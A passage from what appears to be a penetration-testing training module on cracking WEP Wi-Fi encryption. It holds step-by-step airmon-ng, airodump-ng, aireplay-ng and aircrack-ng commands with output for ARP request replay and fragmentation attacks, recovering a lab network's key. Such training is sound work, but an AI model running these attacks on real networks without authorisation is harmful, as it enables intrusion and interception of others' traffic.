+Final Message 64-bit Seed: b"]~<span class="hljs-tag">\<span class="hljs-name">xb</span></span>7y<span class="hljs-tag">\<span class="hljs-name">x</span></span>12uhO<span class="hljs-tag">\<span class="hljs-name">x</span></span>0e<span class="hljs-tag">\<span class="hljs-name">x</span></span>99<span class="hljs-tag">\<span class="hljs-name">xa</span></span>0<span class="hljs-tag">\<span class="hljs-name">xd</span></span>5<span class="hljs-tag">\<span class="hljs-name">xe</span></span>08<span class="hljs-tag">\<span class="hljs-name">x</span></span>11<span class="hljs-tag">\<span class="hljs-name">xc</span></span>6+O'<span class="hljs-tag">\<span class="hljs-name">x</span></span>81%<span class="hljs-tag">\<span class="hljs-name">xf</span></span>6<span class="hljs-tag">\<span class="hljs-name">x</span></span>9a<span class="hljs-tag">\<span class="hljs-name">x</span></span>89<span class="hljs-tag">\<span class="hljs-name">xa</span></span>8<span class="hljs-tag">\<span class="hljs-name">x</span></span>13"
+Final Message 128-bit Seed: b']~<span class="hljs-tag">\<span class="hljs-name">xb</span></span>7<span class="hljs-tag">\<span class="hljs-name">x</span></span>12u<span class="hljs-tag">\<span class="hljs-name">x</span></span>96<span class="hljs-tag">\<span class="hljs-name">x</span></span>0bA<span class="hljs-tag">\<span class="hljs-name">xc</span></span>1<span class="hljs-tag">\<span class="hljs-name">x</span></span>07<span class="hljs-tag">\<span class="hljs-name">xe</span></span>5a-Wt<span class="hljs-tag">\<span class="hljs-name">x</span></span>84<span class="hljs-tag">\<span class="hljs-name">x</span></span>14/<span class="hljs-tag">\<span class="hljs-name">x</span></span>1d<span class="hljs-tag">\<span class="hljs-name">xa</span></span>6oJ<span class="hljs-tag">\<span class="hljs-name">x</span></span>1d<span class="hljs-tag">\<span class="hljs-name">x</span></span>16_<span class="hljs-tag">\<span class="hljs-name">xdb</span></span>'</span>
+</code></pre>
+<p>As we can see, the final message is different each time the script is run. This is due to the IV being randomly generated, as we have mentioned previously.</p>
+<p>  Putting Together the Algorithms</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ python3 mockcipher.py
+
+-------------
+CRC32 Checksum: 2950664974
+Initialization Vector: b'`<span class="hljs-symbol">\x</span>8a<span class="hljs-symbol">\x</span>a6'
+64-bit Seed: b'`<span class="hljs-symbol">\x</span>8a<span class="hljs-symbol">\x</span>a6<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>04<span class="hljs-symbol">\x</span>05'
+128-bit Seed: b'`<span class="hljs-symbol">\x</span>8a<span class="hljs-symbol">\x</span>a6<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>04<span class="hljs-symbol">\x</span>05<span class="hljs-symbol">\x</span>06<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>08<span class="hljs-symbol">\t</span><span class="hljs-symbol">\n</span><span class="hljs-symbol">\x</span>0b<span class="hljs-symbol">\x</span>0c<span class="hljs-symbol">\r</span>'
+-------------
+ICV Message: b'Something Sensitive<span class="hljs-symbol">\x</span>af<span class="hljs-symbol">\x</span>df<span class="hljs-symbol">\x</span>93<span class="hljs-symbol">\x</span>0e'
+Cipher Text 64-bit Seed: b'<span class="hljs-symbol">\x</span>e4<span class="hljs-symbol">\x</span>aa<span class="hljs-symbol">\x</span>a3n<span class="hljs-symbol">\x</span>b5<span class="hljs-symbol">\x</span>9e<span class="hljs-symbol">\x</span>c0<span class="hljs-symbol">\x</span>d4P=L<span class="hljs-symbol">\x</span>cc<span class="hljs-symbol">\x</span>9c<span class="hljs-symbol">\x</span>b6<span class="hljs-symbol">\x</span>b7?<span class="hljs-symbol">\x</span>bfB<span class="hljs-symbol">\x</span>cd<span class="hljs-symbol">\x</span>f1HR<span class="hljs-symbol">\x</span>a6'
+Cipher Text 128-bit Seed: b'<span class="hljs-symbol">\x</span>10<span class="hljs-symbol">\x</span>bb<span class="hljs-symbol">\x</span>86<span class="hljs-symbol">\x</span>89E<span class="hljs-symbol">\x</span>9b<span class="hljs-symbol">\x</span>e0HLf<span class="hljs-symbol">\x</span>b6<span class="hljs-symbol">\x</span>eb<span class="hljs-symbol">\x</span>1e<span class="hljs-symbol">\x</span>f6_j<span class="hljs-symbol">\x</span>e6n,<span class="hljs-symbol">\x</span>b0<span class="hljs-symbol">\x</span>dd<span class="hljs-symbol">\x</span>d0<span class="hljs-symbol">\x</span>08'
+-------------
+Final Message 64-bit Seed: b'`<span class="hljs-symbol">\x</span>8a<span class="hljs-symbol">\x</span>a6<span class="hljs-symbol">\x</span>e4<span class="hljs-symbol">\x</span>aa<span class="hljs-symbol">\x</span>a3n<span class="hljs-symbol">\x</span>b5<span class="hljs-symbol">\x</span>9e<span class="hljs-symbol">\x</span>c0<span class="hljs-symbol">\x</span>d4P=L<span class="hljs-symbol">\x</span>cc<span class="hljs-symbol">\x</span>9c<span class="hljs-symbol">\x</span>b6<span class="hljs-symbol">\x</span>b7?<span class="hljs-symbol">\x</span>bfB<span class="hljs-symbol">\x</span>cd<span class="hljs-symbol">\x</span>f1HR<span class="hljs-symbol">\x</span>a6'
+Final Message 128-bit Seed: b'`<span class="hljs-symbol">\x</span>8a<span class="hljs-symbol">\x</span>a6<span class="hljs-symbol">\x</span>10<span class="hljs-symbol">\x</span>bb<span class="hljs-symbol">\x</span>86<span class="hljs-symbol">\x</span>89E<span class="hljs-symbol">\x</span>9b<span class="hljs-symbol">\x</span>e0HLf<span class="hljs-symbol">\x</span>b6<span class="hljs-symbol">\x</span>eb<span class="hljs-symbol">\x</span>1e<span class="hljs-symbol">\x</span>f6_j<span class="hljs-symbol">\x</span>e6n,<span class="hljs-symbol">\x</span>b0<span class="hljs-symbol">\x</span>dd<span class="hljs-symbol">\x</span>d0<span class="hljs-symbol">\x</span>08'
+</code></pre>
+<p>Next, we will explore how to find the initialization vector for a WEP packet in Wireshark. Doing so will allow us to understand how easy it is for attackers to retrieve this portion of the seed.</p>
+<hr>
+<h2 id="finding-the-initialization-vector-with-wireshark">Finding the Initialization Vector with Wireshark</h2>
+<hr>
+<p>In this section, we will explore how the <code>Integrity Check Value (ICV)</code> and <code>Initialization Vector (IV)</code> can be acquired using the Aircrack suite. We do so by listening to communications between the target access point and connected stations. The traffic will be output to a capture file, which we can open with Wireshark.</p>
+<p>Let's begin by listing the available wireless interfaces on our attack host.</p>
+<p>  Finding the Initialization Vector with Wireshark</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ iwconfig
+
+lo        no wireless extensions.
+
+eth0      no wireless extensions.
+
+wlan0     IEEE <span class="hljs-number">802.11</span>  <span class="hljs-string">ESSID:</span>off/any  
+<span class="hljs-symbol">         Mode:</span>Managed  Access <span class="hljs-string">Point:</span> Not-Associated   Tx-Power=<span class="hljs-number">20</span> dBm   
+         Retry <span class="hljs-keyword">short</span>  <span class="hljs-keyword">long</span> <span class="hljs-string">limit:</span><span class="hljs-number">2</span>   RTS <span class="hljs-string">thr:</span>off   Fragment <span class="hljs-string">thr:</span>off
+         Power <span class="hljs-string">Management:</span>off
+</code></pre>
+<p>Prior to scanning, we must enable monitor mode.</p>
+<p>  Finding the Initialization Vector with Wireshark</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sudo airmon-ng start wlan0
+
+Found 4 processes that could cause trouble.
+Kill them using 'airmon-ng<span class="hljs-built_in"> check </span>kill' before putting
+the card in<span class="hljs-built_in"> monitor </span>mode, they will interfere by changing channels<span class="hljs-built_in">
+and </span>sometimes putting the interface back in managed mode
+
+   PID Name
+   602 avahi-daemon
+   614 avahi-daemon
+   700 NetworkManager
+   701 wpa_supplicant
+
+PHY     Interface       Driver          Chipset
+
+phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT****
+</code></pre>
+<p>Should there be any conflicting processes, the following command will kill them.</p>
+<p>  Finding the Initialization Vector with Wireshark</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sudo airmon-ng<span class="hljs-built_in"> check </span>kill
+
+Killing these processes:
+
+   PID Name
+   701 wpa_supplicant
+</code></pre>
+<p>We can now resume our efforts, broadly scanning in search of wireless networks that use WEP.</p>
+<p>  Finding the Initialization Vector with Wireshark</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sudo airodump-ng wlan0mon
+
+CH<span class="hljs-number"> 11 </span>][ Elapsed:<span class="hljs-number"> 0 </span>s ][ 2022-12-28 17:37 
+
+BSSID              PWR  Beacons    <span class="hljs-comment">#Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID</span>
+
+60:38:E0:71:E9:DC   -3       <span class="hljs-number"> 2 </span>      <span class="hljs-number"> 0 </span>  <span class="hljs-number"> 0 </span> <span class="hljs-number"> 3 </span>  54e. WEP  WEP         HTB-Wireless                            
+7C:XX:XX:XX:XX:XX  -41       <span class="hljs-number"> 1 </span>      <span class="hljs-number"> 0 </span>  <span class="hljs-number"> 0 </span> <span class="hljs-number"> 6 </span><span class="hljs-number"> 130 </span>  WPA2 CCMP   PSK  FakeNetwork
+7C:XX:XX:XX:XX:XX  -46       <span class="hljs-number"> 1 </span>      <span class="hljs-number"> 0 </span>  <span class="hljs-number"> 0 </span><span class="hljs-number"> 10 </span><span class="hljs-number"> 130 </span>  WPA2 CCMP   PSK  FakeNetwork
+7C:XX:XX:XX:XX:XX  -48       <span class="hljs-number"> 1 </span>      <span class="hljs-number"> 0 </span>  <span class="hljs-number"> 0 </span><span class="hljs-number"> 11 </span><span class="hljs-number"> 130 </span>  WPA2 CCMP   PSK  FakeNetwork
+7C:XX:XX:XX:XX:XX  -42       <span class="hljs-number"> 1 </span>      <span class="hljs-number"> 0 </span>  <span class="hljs-number"> 0 </span><span class="hljs-number"> 11 </span><span class="hljs-number"> 130 </span>  WPA2 CCMP   PSK  FakeNetwork
+7C:XX:XX:XX:XX:XX  -45       <span class="hljs-number"> 1 </span>      <span class="hljs-number"> 0 </span>  <span class="hljs-number"> 0 </span><span class="hljs-number"> 11 </span><span class="hljs-number"> 130 </span>  WPA2 CCMP   PSK  FakeNetwork
+7C:XX:XX:XX:XX:XX  -44       <span class="hljs-number"> 1 </span>      <span class="hljs-number"> 0 </span>  <span class="hljs-number"> 0 </span><span class="hljs-number"> 11 </span><span class="hljs-number"> 130 </span>  WPA2 CCMP   PSK  FakeNetwork
+</code></pre>
+<p>Once we know the BSSID and channel of our WEP-enabled target, we can refine the scan results to focus solely on it. Running the command again, we specify the channel the AP operates on with <code>-c 3</code> and the name of the capture file with <code>-w WEP</code>. The saved file will be used for later analysis.</p>
+<p>  Finding the Initialization Vector with Wireshark</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sudo airodump-ng -c<span class="hljs-number"> 3 </span>--bssid 60:38:E0:71:E9:DC wlan0mon -w WEP
+
+  CH <span class="hljs-number"> 3 </span>][ Elapsed:<span class="hljs-number"> 48 </span>s ][ 2022-12-28 17:40 
+
+ BSSID              PWR RXQ  Beacons    <span class="hljs-comment">#Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID</span>
+
+ 60:38:E0:71:E9:DC   -3<span class="hljs-number"> 100 </span>    <span class="hljs-number"> 445 </span>    <span class="hljs-number"> 731 </span> <span class="hljs-number"> 28 </span> <span class="hljs-number"> 3 </span>  54e. WEP  WEP    OPN  HTB-Wireless                        
+
+ BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+
+ 60:38:E0:71:E9:DC  2C:6D:C1:XX:XX:XX  -22   54e-54e    <span class="hljs-number"> 2 </span>     464
+</code></pre>
+<p>After scanning for a few seconds, we can terminate the session and open the capture file in Wireshark. By selecting any IEEE <a href="https://wiki.wireshark.org/Wi-Fi">802.11 data packet</a> and expanding the <code>'IEEE 802.11 Data'</code> and <code>'WEP Parameters'</code> sections, we can view the packet's initialization vector (IV) along with the message ICV (CRC32). As previously mentioned, the IV is attached to the encrypted message, allowing us to extract it from the captured packets.</p>
+<p><img src="storage\modules\185\Wireshark\IV.png" alt="Network packet details showing IEEE 802.11 data with WEP parameters, including Initialization Vector: 0x131000, Key Index: 0, and WEP ICV not verified."></p>
+<hr>
+<h3 id="moving-on">Moving On</h3>
+<p>The more packets we capture, the more initialization vectors (IVs) we are able to obtain, making it easier to crack the key using <code>aircrack-ng</code>. In the following sections, we will explore various WEP attack techniques, each typically having the similar goal of generating IVs. While these attacks differ in their approach, they generally involve replaying ARP requests or other packets of valid network traffic. This process produces enough IVs to build a decryption table and eventually recover the WEP key.</p>
+<hr>
+<h2 id="arp-request-replay-attack">ARP Request Replay Attack</h2>
+<hr>
+<p>The classic <a href="https://www.aircrack-ng.org/doku.php?id=arp-request_reinjection">ARP Request Replay Attack</a> is a highly effective and reliable method for generating new initialization vectors (IVs). In this attack, an ARP packet is captured and retransmitted back to the access point (AP). This action prompts the AP to resend the packet, but with a new IV each time. The continuous replay of the same ARP packet forces the AP to respond repeatedly with different IVs. Collecting these packets with new IVs allows for the eventual determination of the WEP key.</p>
+<p>To conduct an ARP Request Replay attack, <code>aireplay-ng</code> will be used to capture a valid ARP request, which is then replayed continuously until enough initialization vectors are gathered to crack the key (using either the <code>Korek/FMS</code> attack or the default <code>PTW</code> attack).</p>
+<hr>
+<p>We first need to enable monitor mode on our wireless network interface. This allows us to capture and inject packets.</p>
+<p><strong>Enabling Monitor Mode</strong></p>
+<p>  ARP Request Replay Attack</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sudo airmon-ng start wlan0
+
+Found 2 processes that could cause trouble.
+Kill them using 'airmon-ng<span class="hljs-built_in"> check </span>kill' before putting
+the card in<span class="hljs-built_in"> monitor </span>mode, they will interfere by changing channels<span class="hljs-built_in">
+and </span>sometimes putting the interface back in managed mode
+
+    PID Name
+    559 NetworkManager
+    798 wpa_supplicant
+
+PHY     Interface       Driver          Chipset
+
+phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
+                (mac80211<span class="hljs-built_in"> monitor </span>mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
+                (mac80211 station mode vif disabled for [phy0]wlan0)
+</code></pre>
+<p>We can test to see if our interface is in monitor mode with the <code>iwconfig</code> utility.</p>
+<p>  ARP Request Replay Attack</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ iwconfig
+
+wlan0mon  IEEE <span class="hljs-number">802.11</span>  <span class="hljs-string">Mode:</span>Monitor  <span class="hljs-string">Frequency:</span><span class="hljs-number">2.457</span> GHz  Tx-Power=<span class="hljs-number">30</span> dBm   
+          Retry <span class="hljs-keyword">short</span>  <span class="hljs-keyword">long</span> <span class="hljs-string">limit:</span><span class="hljs-number">2</span>   RTS <span class="hljs-string">thr:</span>off   Fragment <span class="hljs-string">thr:</span>off
+          Power <span class="hljs-string">Management:</span>off
+</code></pre>
+<hr>
+<p><strong>Performing the Attack</strong></p>
+<p>To begin, we scan our target access point using <code>airodump-ng</code> and capture the communication into a file. We specify our interface in monitor mode with <code>wlan0mon</code>, the channel our access point is running on with <code>-c</code>, and the name/path of our capture file with the <code>-w</code> argument.</p>
+<p>  ARP Request Replay Attack</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ airodump-ng wlan0mon -c<span class="hljs-number"> 1 </span>-w WEP
+
+10:00:17  Created capture file "WEP-01.cap".
+
+ CH <span class="hljs-number"> 1 </span>][ Elapsed:<span class="hljs-number"> 12 </span>s ][ 2024-08-05 10:00
+
+ BSSID              PWR RXQ  Beacons    <span class="hljs-comment">#Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID</span>
+
+ B2:D1:AC:E1:21:D1  -47<span class="hljs-number"> 100 </span>    <span class="hljs-number"> 149 </span>      <span class="hljs-number"> 7 </span>  <span class="hljs-number"> 0 </span> <span class="hljs-number"> 1 </span> <span class="hljs-number"> 11 </span>  WEP  WEP         HackTheWifi
+
+ BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+
+ B2:D1:AC:E1:21:D1  4A:DD:C6:71:5A:3B  -29   <span class="hljs-number"> 1 </span>-<span class="hljs-number"> 5 </span>    <span class="hljs-number"> 0 </span>       6
+</code></pre>
+<p>The above command will continuously scan the target access point and capture the communication, saving it into a file named <code>WEP-01.cap</code>. If there were multiple access points (APs) available and we wanted to focus on one specifically, we would use the <code>-b</code> option followed by the BSSID of the target AP.</p>
+<p>In a second terminal, we can launch the ARP request replay attack using <code>aireplay-ng</code>. We specify the ARP request replay attack mode with <code>-3</code>, the BSSID of the target AP with <code>-b</code>, and the client MAC address with <code>-h</code>. Once a valid ARP request is captured, the tool will replay it automatically.</p>
+<p>  ARP Request Replay Attack</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sudo aireplay-ng -3 -b B2:D1:<span class="hljs-keyword">AC</span>:E1:21:D1 -<span class="hljs-keyword">h</span> 4A:DD:C6:71:5A:3B wlan0mon
+
+The interface <span class="hljs-keyword">MAC</span> (02:00:00:00:01:00) doesn't match the specified <span class="hljs-keyword">MAC</span> (-<span class="hljs-keyword">h</span>).
+        ifconfig wlan0mon hw ether 4A:DD:C6:71:5A:3B
+10:01:29  Waiting <span class="hljs-keyword">for</span> beacon frame (BSSID: B2:D1:<span class="hljs-keyword">AC</span>:E1:21:D1) <span class="hljs-keyword">on</span> channel 1
+Saving ARP requests <span class="hljs-keyword">in</span> replay_arp-0805-100129.<span class="hljs-keyword">cap</span>
+You should also start airodump-ng to <span class="hljs-keyword">capture</span> replies.
+<span class="hljs-keyword">Read</span> 99 packets (got 0 ARP requests), sent 0 packets...
+</code></pre>
+<p>Initially, the number of captured ARP requests will be zero. When a valid ARP request is captured, it will be replayed multiple times, causing the number of captured ARP requests to increase rapidly.</p>
+<p>  ARP Request Replay Attack</p>
+<pre><code class="lang-shell-session">Read <span class="hljs-number">195576</span> packets (got <span class="hljs-number">35039</span> ARP requests and <span class="hljs-number">0</span> ACKs), sent <span class="hljs-number">34758</span> packets...(<span class="hljs-number">500</span> pps)
+</code></pre>
+<p>Once we have generated enough ARP traffic, we can attempt to crack the key with <code>aircrack-ng</code>. We supply the <code>-b</code> option followed by our target BSSID, along with the <code>WEP-01.cap</code> file, where all the initialization vectors are stored.</p>
+<p>  ARP Request Replay Attack</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ aircrack-ng -b <span class="hljs-string">B2:</span><span class="hljs-string">D1:</span><span class="hljs-string">AC:</span><span class="hljs-string">E1:</span><span class="hljs-number">21</span>:D1 WEP<span class="hljs-number">-01.</span>cap
+
+Reading packets, please wait...
+Opening WEP<span class="hljs-number">-01.</span>cap
+Read <span class="hljs-number">195576</span> packets.
+
+<span class="hljs-number">1</span> potential targets
+Got <span class="hljs-number">97822</span> out of <span class="hljs-number">95000</span> IVs
+Starting PTW attack with <span class="hljs-number">97822</span> IVs.
+                     KEY FOUND! [ <span class="hljs-number">33</span>:<span class="hljs-number">44</span>:<span class="hljs-number">55</span>:<span class="hljs-number">22</span>:<span class="hljs-number">11</span> ]
+Attack Decrypted <span class="hljs-string">correctly:</span> <span class="hljs-number">100</span>% captured IVs.
+</code></pre>
+<p>With this retrieved key, we can either connect directly to the target network, or decrypt the traffic with <code>airdecap-ng</code>.</p>
+<p><img src="storage\modules\185\Diagrams\connect.png" alt="Wi-Fi network authentication window for 'HackTheWifi' with key entry field showing '3344552211' and options to show key, cancel, or connect."></p>
+<p>The default cracking method in <code>aircrack-ng</code> is the <code>PTW (Pyshkin, Tews, Weinmann)</code> statistical attack, which requires approximately 20,000 initialization vectors for 64-bit keys and 40,000 or more for 128-bit keys. To use the <code>Korek/FMS</code> attack, we can specify <code>-K</code> in the command, though it requires significantly more IVs—around 250,000 for 64-bit keys and 1.5 million for 128-bit keys—making it slower compared to the PTW attack. For more details, you can refer to the <a href="https://www.aircrack-ng.org/doku.php?id=aircrack-ng\&amp;s%5B%5D=ptw">aircrack-ng documentation</a>.</p>
+<hr>
+<h3 id="moving-on">Moving On</h3>
+<p>In this section, we demonstrated how to generate initialization vectors (IVs) using the <code>ARP Request Replay Attack</code>. By capturing and replaying ARP requests, we were able to accumulate enough IVs to crack the WEP key. In the next section, we will explore an alternative method for generating IVs using the <code>Fragmentation Attack</code>.</p>
+<hr>
+<h2 id="fragmentation-attack">Fragmentation Attack</h2>
+<hr>
+<p>By now, we have learned that if we generate enough unique initialization vectors (IVs) and save the communication to a file, it enables us to crack the key. For an <code>ARP request replay attack</code>, capturing a valid ARP request (broadcast request) in the network is essential. However, if no ARP requests are being made, we can use a <a href="https://www.aircrack-ng.org/doku.php?id=fragmentation">Fragmentation Attack</a> instead. This attack achieves the same goal, but through an entirely different method: using fragmented packets to recover the PRGA (Pseudo Random Generation Algorithm) keystream.</p>
+<p>PRGA bytes allow us to forge any packet. This works because encryption in WEP is simply a XOR operation between the PRGA and the plaintext message. Knowing this, we can use any IV to encrypt arbitrary data. Similarly, if both a packet's plaintext and ciphertext are known, the PRGA can be derived.</p>
+<p>In 802.11 communications, almost all packets are encapsulated with an <a href="https://dox.ipxe.org/structieee80211__llc__snap__header.html">LLC/SNAP header</a>. The first 7 bytes of this header are always the same, and the 8th byte varies based on whether the packet is ARP or IP. Since ARP packets are always 36 bytes, they can be easily distinguished from IP packets. When we capture a packet, we immediately know at least 8 bytes of plaintext, and thus can derive 8 bytes of the PRGA.</p>
+<p>Fragmentation further accelerates the process of PRGA recovery. Because WEP encryption is applied to each individual fragment, we can exploit this by crafting a long broadcast packet with known data and splitting it into smaller fragments. Each fragment allows us to leverage the 8-byte PRGA we've recovered, and when the access point reassembles these fragments, we can capture the full packet and derive even more PRGA. By repeating this process with additional fragments, we quickly collect enough keystream data (1500 bytes) to forge any packet. This allows us to subsequently craft an ARP request and perform an <code>ARP Request Relay</code> attack.</p>
+<hr>
+<p>We first need to enable monitor mode on our wireless network interface. This allows us to capture and inject packets.</p>
+<p><strong>Enabling Monitor Mode</strong></p>
+<p>  Fragmentation Attack</p>
+<pre><code class="lang-shell-session">
+root@htb[/htb]$ sudo airmon-ng start wlan0
+
+Found 2 processes that could cause trouble.
+Kill them using 'airmon-ng<span class="hljs-built_in"> check </span>kill' before putting
+the card in<span class="hljs-built_in"> monitor </span>mode, they will interfere by changing channels<span class="hljs-built_in">
+and </span>sometimes putting the interface back in managed mode
+
+    PID Name
+    559 NetworkManager
+    798 wpa_supplicant
+
+PHY     Interface       Driver          Chipset
+
+phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
+                (mac80211<span class="hljs-built_in"> monitor </span>mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
+                (mac80211 station mode vif disabled for [phy0]wlan0)
+</code></pre>
+<p>After setting the interface into monitor mode, we can verify the change by using the <code>iwconfig</code> utility.</p>
+<p>  Fragmentation Attack</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ iwconfig
+
+wlan0mon  IEEE <span class="hljs-number">802.11</span>  <span class="hljs-string">Mode:</span>Monitor  <span class="hljs-string">Frequency:</span><span class="hljs-number">2.457</span> GHz  Tx-Power=<span class="hljs-number">30</span> dBm   
+          Retry <span class="hljs-keyword">short</span>  <span class="hljs-keyword">long</span> <span class="hljs-string">limit:</span><span class="hljs-number">2</span>   RTS <span class="hljs-string">thr:</span>off   Fragment <span class="hljs-string">thr:</span>off
+          Power <span class="hljs-string">Management:</span>off
+</code></pre>
+<hr>
+<p><strong>Performing the Attack</strong></p>
+<p>We begin by scanning the target access point using <code>airodump-ng</code>, capturing the communication into a file. The interface in monitor mode is specified using <code>wlan0mon</code>, the access point's channel with <code>-c</code>, and the output location with the <code>-w</code> argument.</p>
+<p>  Fragmentation Attack</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ airodump-ng wlan0mon -c<span class="hljs-number"> 1 </span>-w WEP
+
+18:58:49  Created capture file "WEP-01.cap".
+
+ CH <span class="hljs-number"> 1 </span>][ Elapsed:<span class="hljs-number"> 18 </span>mins ][ 2024-08-05 19:16
+
+ BSSID              PWR RXQ  Beacons    <span class="hljs-comment">#Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID</span>
+
+ A2:BD:32:EB:21:15  -47  <span class="hljs-number"> 0 </span>  <span class="hljs-number"> 10632 </span>    <span class="hljs-number"> 264 </span>  <span class="hljs-number"> 0 </span> <span class="hljs-number"> 1 </span> <span class="hljs-number"> 11 </span>  WEP  WEP         HackTheWifi
+
+ BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+
+ A2:BD:32:EB:21:15  42:E9:11:39:88:AE  -29   <span class="hljs-number"> 2 </span>-<span class="hljs-number"> 1 </span>    <span class="hljs-number"> 0 </span>     266
+</code></pre>
+<p>Next, we initiate the fragmentation attack with the following command. The <code>-5</code> option indicates the fragmentation attack, while <code>-b</code> specifies the BSSID of the AP, and <code>-h</code> is the MAC address of the connected station (or any source address that can associate with the AP).</p>
+<p>  Fragmentation Attack</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ aireplay-ng -5 -b A2:BD:32:EB:21:15 -<span class="hljs-keyword">h</span> 42:E9:11:39:88:AE wlan0mon
+
+The interface <span class="hljs-keyword">MAC</span> (02:00:00:00:01:00) doesn't match the specified <span class="hljs-keyword">MAC</span> (-<span class="hljs-keyword">h</span>).
+        ifconfig wlan0mon hw ether 42:E9:11:39:88:AE
+19:18:35  Waiting <span class="hljs-keyword">for</span> beacon frame (BSSID: A2:BD:32:EB:21:15) <span class="hljs-keyword">on</span> channel 1
+19:18:35  Waiting <span class="hljs-keyword">for</span> a data packet...
+<span class="hljs-keyword">Read</span> 66 packets...
+
+        Size: 100, FromDS: 0, ToDS: 1 (WEP)
+
+              BSSID  =  A2:BD:32:EB:21:15
+          Dest. <span class="hljs-keyword">MAC</span>  =  A2:BD:32:EB:21:15
+         Source <span class="hljs-keyword">MAC</span>  =  42:E9:11:39:88:AE
+
+        0x0000:  0841 0201 d8d6 3deb 29d5 42e9 1139 88ae  .A....=.).B..9..
+        0x0010:  d8d6 3deb 29d5 1026 4f54 f100 dca9 17cd  ..=.)..&amp;OT......
+        0x0020:  7d16 6690 e06e 2bbf 45e6 416b f0a0 5e22  }.f..<span class="hljs-keyword">n</span>+.<span class="hljs-keyword">E</span>.Ak..^"
+        0x0030:  a8a7 dc23 ba6b 8e83 7523 21e3 4429 f6a2  ...#.k..<span class="hljs-keyword">u</span>#!.<span class="hljs-keyword">D</span>)..
+        0x0040:  72f1 a051 a481 1cb7 c983 7653 9db4 cb71  r..Q......vS...<span class="hljs-built_in">q</span>
+        0x0050:  d4ca 075d 1117 59b8 aa8d 2779 582b 7f52  ...]..Y...'<span class="hljs-keyword">yX</span>+<span class="hljs-built_in">R</span>
+        0x0060:  339e d3be                                3...
+
+<span class="hljs-keyword">Use</span> this packet ? <span class="hljs-built_in">y</span>
+
+Saving chosen packet <span class="hljs-keyword">in</span> replay_src-0805-191842.<span class="hljs-keyword">cap</span>
+19:18:51  Data packet found!
+19:18:51  Sending fragmented packet
+19:18:51  Got RELAYED packet!!
+19:18:51  Trying to get 384 bytes of a keystream
+19:18:51  Got RELAYED packet!!
+19:18:51  Trying to get 1500 bytes of a keystream
+19:18:51  Got RELAYED packet!!
+Saving keystream <span class="hljs-keyword">in</span> fragment-0805-191851.xor
+Now you can build a packet with packetforge-ng <span class="hljs-keyword">out</span> of that 1500 bytes keystream
+</code></pre>
+<p>A successful fragmentation attack will display an output indicating that the PRGA <code>xor</code> file has been saved. Afterward, we need to analyze the capture file to identify the source and destination IP addresses, as well as the MAC addresses. This can be accomplished with <code>tcpdump</code>.</p>
+<p>  Fragmentation Attack</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ tcpdump -s <span class="hljs-number">0</span> -n -e -r replay_src<span class="hljs-number">-0805</span><span class="hljs-number">-191842.</span>cap
+
+reading from file replay_src<span class="hljs-number">-0805</span><span class="hljs-number">-191842.</span>cap, link-type IEEE802_11 (<span class="hljs-number">802.11</span>), snapshot length <span class="hljs-number">65535</span>
+<span class="hljs-number">13</span>:<span class="hljs-number">20</span>:<span class="hljs-number">06.328586</span> CF +QoS <span class="hljs-string">BSSID:</span><span class="hljs-string">a2:</span><span class="hljs-string">bd:</span><span class="hljs-number">32</span>:<span class="hljs-string">eb:</span><span class="hljs-number">21</span>:<span class="hljs-number">15</span> <span class="hljs-string">SA:</span><span class="hljs-number">42</span>:<span class="hljs-string">e9:</span><span class="hljs-number">11</span>:<span class="hljs-number">39</span>:<span class="hljs-number">88</span>:ae <span class="hljs-string">DA:</span><span class="hljs-string">a2:</span><span class="hljs-string">bd:</span><span class="hljs-number">32</span>:<span class="hljs-string">eb:</span><span class="hljs-number">21</span>:<span class="hljs-number">15</span> LLC, dsap SNAP
+(<span class="hljs-number">0xaa</span>) Individual, ssap SNAP (<span class="hljs-number">0xaa</span>) Command, ctrl <span class="hljs-number">0x03</span>: oui Ethernet (<span class="hljs-number">0x000000</span>), ethertype IPv4 (<span class="hljs-number">0x0800</span>),
+length <span class="hljs-number">67</span>: <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.129</span><span class="hljs-number">.63870</span> &gt; <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span><span class="hljs-number">.53</span>: <span class="hljs-number">34696</span>+ A? outlook.office365.com. (39)
+</code></pre>
+<p>Once we have the required addresses, we can forge an ARP request using <code>packetforge-ng</code>. In this command, we specify the access point's MAC address with <code>-a</code>, the station’s MAC address with <code>-h</code>, the access point’s IP address with <code>-k</code>, the station’s IP address with <code>-l</code>, the location and name of our PRGA file with <code>-y</code>, and finally the output name for the forged ARP request capture file with <code>-w</code>.</p>
